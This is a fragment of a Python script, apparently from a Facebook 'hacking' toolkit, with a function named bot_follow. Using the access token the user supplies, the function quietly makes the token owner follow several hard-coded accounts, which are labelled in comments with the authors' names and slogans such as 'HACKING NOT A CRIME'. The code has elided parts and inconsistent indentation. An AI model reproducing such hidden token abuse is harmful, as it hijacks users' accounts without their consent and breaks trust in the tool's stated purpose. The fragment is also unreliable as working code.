#!/usr/bin/python
# -*- coding: utf-8
# Facebook  : Zeeshii Malik X
# Instagram : +923072780963
...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #ZEESHII MALIK
    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #FAISU BABA
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #TABIR JATTI
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #WORLD HACKER 
    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #KING MAKER
    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #HACKING NOT A CRIME
    	menu()
